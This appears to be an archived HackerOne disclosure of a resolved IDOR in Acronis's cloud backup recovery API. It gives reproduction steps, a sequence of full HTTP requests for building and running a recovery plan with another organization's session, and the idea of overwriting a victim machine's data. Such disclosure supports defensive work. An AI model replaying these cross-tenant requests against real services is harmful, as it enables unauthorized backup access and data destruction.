---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - env/web
  - vuln/idor
  - impact/account-takeover
substate: "resolved"
weakness: null
enriched: true
body: true
date: 2024-11-13
submitted: 2023-03-12T01:02:24.410Z
bounty_usd: null
votes: 56
cve: []
program: "[[programs/acronis|Acronis]]"
reporter: "0xnullref"
source: "https://hackerone.com/reports/1901713"
title: "IDOR in backup recovery functionality"
---
# IDOR in backup recovery functionality

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 56 | **Program:** Acronis | **Disclosed:** 2024-11-13

- Report: [https://hackerone.com/reports/1901713](https://hackerone.com/reports/1901713)
- CWE: N/A
- Submitted: 2023-03-12T01:02:24.410Z

## Report summary

IDOR in backup recovery functionality allowed an authenticated attacker knowing user's machine UUID, backup ID and some other parameters to configure and run recovery plan. 

We have seen no signs of the exploitation of this vulnerability.

Access Control Flaw Leading to Critical Data Deletion through Backup Overwrite Exploit
{F3758159}

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary
Hi team I hope you are well, there is an issue let me to takeover any backup via recover it to my machine.

## Steps To Reproduce
1. Login https://mc-beta-cloud.acronis.com
2. Visit the DEVICES section [you must have 2 devices]
3. Click on any device has a backup [device_1]
4. Click on recovery > select machine > select the second machine [device_2]
5. follow the steps to recover the backup to [device_2]
6. In the burp search for this endpoint ```/bc/api/ams/recovery/plan_operations/run```
7. Send the request again via ==X-Apigw-Session== session from another organization.


## POC

{F2222128}

## Impact

- Backup Takeover via recovery function.

## Timeline

- **Report Filed**
- **2023-03-12** @0xnullref: ### HTTP Request:
```
POST /bc/api/ams/recovery/plan_operations/run?machineId=1c68b833-71dd-4f6d-ab2c-42b5e6020978 HTTP/1.1
Host: mc-beta-cloud.acronis.com
Cookie: X-Apigw-Session=<session>;
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json; charset=utf-8
X-Acronis-Api: 1
X-Requested-With: XMLHttpRequest
Content-Length: 144
Origin: https://mc-beta-cloud.acronis.com
Referer: https://mc-beta-cloud.acronis.com/ui/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

{"planId":"C13D05D5-F68C-42DE-957F-C9090C433169","machineId":"1c68b833-71dd-4f6d-ab2c-42b5e6020978","subscriptionId":"2","operationId":"noWait"}
```
- **2023-03-13** @security-bot: Hi @theelgo64

Thanks for participating in Acronis bug bounty program!
Our security team usually replies within 1-2 business days.

Meanwhile, I'd recommend you to check out our [policy](https://hackerone.com/acronis).
- **Report Needs More Info**
- **Report New**
- **2023-03-14** @0xnullref: @stushieva,

Since yesterday, I have been trying to overcome the problem, which is that all requests are working fine except for the request before the final, which covers the value of  ```planId``` parameter, but the response is empty.

## the 1st request

```
POST /bc/api/ams/recovery/plan_drafts?machineId=b09259dd-e7c2-4c17-b48c-ad30d3335091 HTTP/1.1
Host: mc-beta-cloud.acronis.com
Cookie: X-Apigw-Session=<>;
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json; charset=utf-8
X-Acronis-Api: 1
X-Requested-With: XMLHttpRequest
Content-Length: 1511
Origin: https://mc-beta-cloud.acronis.com
Referer: https://mc-beta-cloud.acronis.com/ui/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

{"subscriptionId":"1","operationId":"rec-draft-1-0","backupId":"avfs:/online?account%3dtheelgo64%252bcustomer%26computer%3d1%26provider%3dAcronis#arl:/ED4EC009-25B6-4D0E-B356-3E32F5BC6B08/C4764660-0690-3250-2503-4E0AD21CD900/A08ABE6C-E900-5879-F44B-952751B22F62/DE97D9D7-ABB5-407A-BAD7-0A3C911D42E8?archive_name%3dWIN-ERAKDQ2D2Q4-31517ACB-64DF-401A-9961-300277D8B751-AA3C7014-CADF-4193-8869-3AFAA6B53FCFA","machineId":"b09259dd-e7c2-4c17-b48c-ad30d3335091","useCredStore":true,"credStoreExternalIds":{"archive":"a08abe6c-e900-5879-f44b-952751b22f62@archive!2960029","vault":"c4764660-0690-3250-2503-4e0ad21cd900@location!2960029"},"agentTenantId":"2960029","credStoreArchiveScope":{"type":"archive","subType":"endpoint"},"credStoreVaultScope":{"type":"share","subType":"smb"},"archiveId":"a08abe6c-e900-5879-f44b-952751b22f62","vaultId":"c4764660-0690-3250-2503-4e0ad21cd900","sliceId":"de97d9d7-abb5-407a-bad7-0a3c911d42e8","resourcesIds":["[[\"0B781614-5AED-4A10-9B79-0A607CB7EEAE\",\"ED4EC009-25B6-4D0E-B356-3E32F5BC6B08\"],[\"ItemType\",\"dms:file\"],[\"LocalID\",\"file=C%3a%5cUsers%5cAdministrator%5cDesktop%5cPOC.txt&slice=avfs%3a%2fonline%3faccount%253dtheelgo64%25252bcustomer%2526computer%253d1%2526provider%253dAcronis%23arl%3a%2fED4EC009-25B6-4D0E-B356-3E32F5BC6B08%2fC4764660-0690-3250-2503-4E0AD21CD900%2fA08ABE6C-E900-5879-F44B-952751B22F62%2fDE97D9D7-ABB5-407A-BAD7-0A3C911D42E8%3farchive_name%253dWIN-ERAKDQ2D2Q4-31517ACB-64DF-401A-9961-300277D8B751-AA3C7014-CADF-4193-8869-3AFAA6B53FCFA\"]]"]}
```

## the 2nd request (to get the draftid param)

```
POST /bc/api/subscriptions/1 HTTP/1.1
Host: mc-beta-cloud.acronis.com
Cookie: X-Apigw-Session=<>;
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json; charset=utf-8
X-Acronis-Api: 1
X-Requested-With: XMLHttpRequest
Content-Length: 29
Origin: https://mc-beta-cloud.acronis.com
Referer: https://mc-beta-cloud.acronis.com/ui/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

{"action":"pop","timeout":10}
```

## the 3rd request (to set the recovery PATH)

```
PUT /bc/api/ams/recovery/plan_drafts/4CBC3C80-F69B-4C5C-9474-11D7134798C7/target_location?machineId=b09259dd-e7c2-4c17-b48c-ad30d3335091 HTTP/1.1
Host: mc-beta-cloud.acronis.com
Cookie: X-Apigw-Session=<>;
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json; charset=utf-8
X-Acronis-Api: 1
X-Requested-With: XMLHttpRequest
Content-Length: 70
Origin: https://mc-beta-cloud.acronis.com
Referer: https://mc-beta-cloud.acronis.com/ui/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

{"type":"original","machineId":"b09259dd-e7c2-4c17-b48c-ad30d3335091"}
```

## the 4th request

```
PUT /bc/api/ams/recovery/plan_drafts/4CBC3C80-F69B-4C5C-9474-11D7134798C7/options HTTP/1.1
Host: mc-beta-cloud.acronis.com
Cookie: X-Apigw-Session=<>;
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json; charset=utf-8
X-Acronis-Api: 1
X-Requested-With: XMLHttpRequest
Content-Length: 1039
Origin: https://mc-beta-cloud.acronis.com
Referer: https://mc-beta-cloud.acronis.com/ui/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

{"subscriptionId":"1","operationId":"rec-setoptions-1-1","snmp":{"community":"","address":"","commonTrace":{"traceState":false,"isGlobalConfigurationUsed":true,"traceLevel":"warning"}},"windowsEventLog":{"traceState":false,"isGlobalConfigurationUsed":true,"traceLevel":"warning"},"silentReboot":true,"errorHandling":{"reattemptsCount":30,"reattemptTimeFrame":{"value":30,"type":"seconds"},"reattemptOnError":true,"silentMode":false},"prePostCommands":{"usePostCommands":false,"postCommands":{"command":"","commandArguments":"","workingDirectory":"","waitCommandComplete":true,"continueOnCommandError":false},"usePreCommands":false,"preCommands":{"command":"","commandArguments":"","workingDirectory":"","waitCommandComplete":true,"continueOnCommandError":false},"useDefaultCommands":true},"validateBackupsBeforeRecover":false,"recoverPriority":"normal","fileOptions":{"exclusions":[],"preserveSecuritySettings":true,"overwriteMode":"overwriteOlder","recoverWithFullPath":false,"setCurrentDateTime":false,"recoverMountPointsTargets":false}}
```

## the 5th request

```
POST /bc/api/ams/recovery/plan_drafts/4CBC3C80-F69B-4C5C-9474-11D7134798C7 HTTP/1.1
Host: mc-beta-cloud.acronis.com
Cookie:  X-Apigw-Session=<>;
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json; charset=utf-8
X-Acronis-Api: 1
X-Requested-With: XMLHttpRequest
Content-Length: 57
Origin: https://mc-beta-cloud.acronis.com
Referer: https://mc-beta-cloud.acronis.com/ui/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

{"subscriptionId":"1","operationId":"rec-createplan-1-2"}
```


## the 6th request (to get the planId param [This step stopped me because the response data does not contain to the planid])

```
POST /bc/api/subscriptions/1 HTTP/1.1
Host: mc-beta-cloud.acronis.com
Cookie: X-Apigw-Session=<>;
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json; charset=utf-8
X-Acronis-Api: 1
X-Requested-With: XMLHttpRequest
Content-Length: 29
Origin: https://mc-beta-cloud.acronis.com
Referer: https://mc-beta-cloud.acronis.com/ui/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

{"action":"pop","timeout":10}
```

## the last request (to run the recovery)

```
POST /bc/api/ams/recovery/plan_operations/run?machineId=b09259dd-e7c2-4c17-b48c-ad30d3335091 HTTP/1.1
Host: mc-beta-cloud.acronis.com
Cookie: X-Apigw-Session=<>;
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json; charset=utf-8
X-Acronis-Api: 1
X-Requested-With: XMLHttpRequest
Content-Length: 144
Origin: https://mc-beta-cloud.acronis.com
Referer: https://mc-beta-cloud.acronis.com/ui/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

{"planId":"B4CA283B-6FFB-41C4-A7B9-D317486945FE","machineId":"b09259dd-e7c2-4c17-b48c-ad30d3335091","subscriptionId":"1","operationId":"noWait"}
```
- **Report Needs More Info**
- **Report New**
- **2023-03-15** @0xnullref: Thanks again @stushieva for your advice I'm able to get the ```planId``` but I can't change the ```machineId``` to machine out of the group, when I'm try to do that with this short Request:
```
POST /bc/api/ams/recovery/plan_drafts HTTP/1.1
Host: mc-beta-cloud.acronis.com
Cookie: X-Apigw-Session=<>;
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json; charset=utf-8
X-Acronis-Api: 1
X-Requested-With: XMLHttpRequest
Content-Length: 992
Origin: https://mc-beta-cloud.acronis.com
Referer: https://mc-beta-cloud.acronis.com/ui/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

{"backupId":"avfs:/online?account%3dtheelgo64%252bcustomer%26computer%3d1%26provider%3dAcronis#arl:/ED4EC009-25B6-4D0E-B356-3E32F5BC6B08/C4764660-0690-3250-2503-4E0AD21CD900/A08ABE6C-E900-5879-F44B-952751B22F62/DE97D9D7-ABB5-407A-BAD7-0A3C911D42E8?archive_name%3dWIN-ERAKDQ2D2Q4-31517ACB-64DF-401A-9961-300277D8B751-AA3C7014-CADF-4193-8869-3AFAA6B53FCFA","machineId":"6cc5bab7-e0e2-432f-b989-cfa94ceeb5a2","resourcesIds":["[[\"0B781614-5AED-4A10-9B79-0A607CB7EEAE\",\"ED4EC009-25B6-4D0E-B356-3E32F5BC6B08\"],[\"ItemType\",\"dms:file\"],[\"LocalID\",\"file=C%3a%5cUsers%5cAdministrator%5cDesktop%5cPOC.txt&slice=avfs%3a%2fonline%3faccount%253dtheelgo64%25252bcustomer%2526computer%253d1%2526provider%253dAcronis%23arl%3a%2fED4EC009-25B6-4D0E-B356-3E32F5BC6B08%2fC4764660-0690-3250-2503-4E0AD21CD900%2fA08ABE6C-E900-5879-F44B-952751B22F62%2fDE97D9D7-ABB5-407A-BAD7-0A3C911D42E8%3farchive_name%253dWIN-ERAKDQ2D2Q4-31517ACB-64DF-401A-9961-300277D8B751-AA3C7014-CADF-4193-8869-3AFAA6B53FCFA\"]]"]}
```

I got this Response:
```
HTTP/1.1 400 BAD REQUEST
Date: Wed, 15 Mar 2023 21:27:49 GMT
Content-Type: application/json
Content-Length: 3263
Connection: close
Set-Cookie: session=<>.FvPJ1Q.6gy8uU21Gmt3Rt431C4JZ1s-qNc; Expires=Wed, 15-Mar-2023 21:37:49 GMT; Max-Age=600; Secure; HttpOnly; Path=/
Access-Control-Allow-Origin: https://mc-beta-cloud.acronis.com
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: ETag,Content-Length,Content-Type,Retry-After
Content-Security-Policy: frame-ancestors 'self' https://mc-beta-cloud.acronis.com
P3P: CP="ALL IND DSP COR ADM CONo CUR CUSo IVAo IVDo PSA PSD TAI TELo OUR SAMo CNT COM INT NAV ONL PHY PRE PUR UNI"
X-Content-Type-Options: nosniff
Front-End-Https: on
Strict-Transport-Security: max-age=31536000; includeSubDomains

{"serCode":"0x01350016+0x01350016+0x01350016+0x01350016+0x02330004+0x00A100D4+0x00A100C9+0x029B004F","troubleshoot":null,"reason":"internalError","kb_link":"https://kb.acronis.com/errorcode?ser=0x01350016%2B0x01350016%2B0x01350016%2B0x01350016%2B0x02330004%2B0x00A100D4%2B0x00A100C9%2B0x029B004F&linetag=0x8D165E86FB8196E0%2B0x8D165E86FB8196E0%2B0x8D165E86FB8196E0%2B0x8D165E86FB8196E0%2B0x0398A183E0808D64%2B0x0B320396ADFE3E5C%2B0xD5796A33131EE948%2B0x60CCAC0523AC0E20&os=Windows&product=adc&version=12.27&build=31788&language=en-US","stacktrace":null,"context":{"_internal":"0:0:-1","effect_str":"TOL: Failed to execute the command. Recovery::Assistant::Commands::NewPlan","operation":"unknown","cause_str":"The instance version of the object does not match the requested one"},"date":"2023-03-15T21:27:49.569864+00:00","origin":{"module":309,"code":22,"fields":{"$module":"management_server_lxa64_31788","CommandID":"DA875FDA-4282-4A51-98B4-E9ADDC73E4D8"},"linetag":"0x8D165E86FB8196E0","text":"TOL: Failed to execute the command. Recovery::Assistant::Commands::NewPlan","suberror":{"module":309,"code":22,"fields":{"$module":"ams_recovery_assistant_addon_lxa64_31788","CommandID":"DA875FDA-4282-4A51-98B4-E9ADDC73E4D8"},"linetag":"0x8D165E86FB8196E0","text":"TOL: Failed to execute the command. Recovery::Assistant::Commands::NewPlan","suberror":{"module":309,"code":22,"fields":{"$module":"mms_vsa64_31877","AgentName":"","CommandID":"DA875FDA-4282-4A51-98B4-E9ADDC73E4D8"},"linetag":"0x8D165E86FB8196E0","text":"TOL: Failed to execute the command. Recovery::Assistant::Commands::NewPlan","suberror":{"module":309,"code":22,"fields":{"$module":"mms_recovery_assistant_addon_vsa64_31877","AgentName":"","CommandID":"DA875FDA-4282-4A51-98B4-E9ADDC73E4D8"},"linetag":"0x8D165E86FB8196E0","text":"TOL: Failed to execute the command. Recovery::Assistant::Commands::NewPlan","suberror":{"module":563,"code":4,"fields":{"$module":"mms_recovery_assistant_addon_vsa64_31877"},"linetag":"0x0398A183E0808D64","text":"The source backup credentials are not specified.","suberror":{"module":161,"code":212,"fields":{"$module":"disk_bundle_vsa64_31877","IsReturnCode":"1"},"linetag":"0x0B320396ADFE3E5C","text":"Failed to find archive 'avfs:/online?account%3dtheelgo64%252bcustomer%26computer%3d1%26provider%3dAcronis#arl:/ED4EC009-25B6-4D0E-B356-3E32F5BC6B08/C4764660-0690-3250-2503-4E0AD21CD900/A08ABE6C-E900-5879-F44B-952751B22F62/DE97D9D7-ABB5-407A-BAD7-0A3C911D42E8?archive_name%3dWIN-ERAKDQ2D2Q4-31517ACB-64DF-401A-9961-300277D8B751-AA3C7014-CADF-4193-8869-3AFAA6B53FCFA'.","suberror":{"module":161,"code":201,"fields":{"$module":"disk_bundle_vsa64_31877"},"linetag":"0xD5796A33131EE948","text":"Failed to get information about the archives.","suberror":{"module":667,"code":79,"fields":{"$module":"disk_bundle_vsa64_31877","path":"/1/WIN-ERAKDQ2D2Q4-31517ACB-64DF-401A-9961-300277D8B751-AA3C7014-CADF-4193-8869-3AFAA6B53FCFA.tibx","function":"astor_file_get_info_path"},"linetag":"0x60CCAC0523AC0E20","text":"The instance version of the object does not match the requested one","suberror":null}}}}}}}},"effect":"TOL: Failed to execute the command. Recovery::Assistant::Commands::NewPlan","cause":"The instance version of the object does not match the requested one"}
```


I don't know if there is a way to bypass this by changing one of the uuid values of [<backupId> and <resourcesIds>] or not.. So I can't go any further because I don't know what these values ​​are. If there is any advice from you, I would welcome it.

Best.
- **2023-03-15** @0xnullref: @stushieva, So the ==impact== in my mind at the moment is that if there is a machine It contains important data. Through this issue, I can delete the all data via recover a complete backup to this machine with option ==overwrite== :-)

Can you please change the Title to ```Remove the full DATA of any machine via recovery function```.
- **Report Needs More Info**
- **Report New**
- **Report Title Updated**
- **Report Severity Updated**
- **Report Triaged**
- **Bounty Awarded**
- **2023-03-23** @0xnullref: Thank you for this wonderful reward and bonus @Acronis :-) . And also a special thanks to @stushieva, Without her advice above, this report would not have been complete.

Also can this report #1549334 get a bonus? as well because it's ==higher impact== than this report.

Best.
- **2023-03-23** @0xnullref: Hi @stushieva, ██████```█████████``` ███████

Thanks.
- **2023-03-24** @stushieva: @theelgo64,

It looks for me like something different. Please, report it separately if you believe there is an issue
- **2023-03-28** @0xnullref: @stushieva,
I hope to give me an answer if this report #1549334  is eligible for the bonus or not 😁😁😁

Thanks.
- **2023-03-29** @stushieva: @theelgo64,

The short answer is no.
 
As you already know, bounties in our program are based on the table you can find in our [policy](https://hackerone.com/acronis). Bonuses, however, are more subjective. For instance, we might award a bonus when our internal investigation reveals additional impact. Sometimes we also award researchers for unusual vectors of exploitation which we haven't seen before. Overall, bonuses are awarded as an exception. Hope this clarifies.
- **2023-03-29** @0xnullref: oh this is disappointing 😅, thanks for the clarification.
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
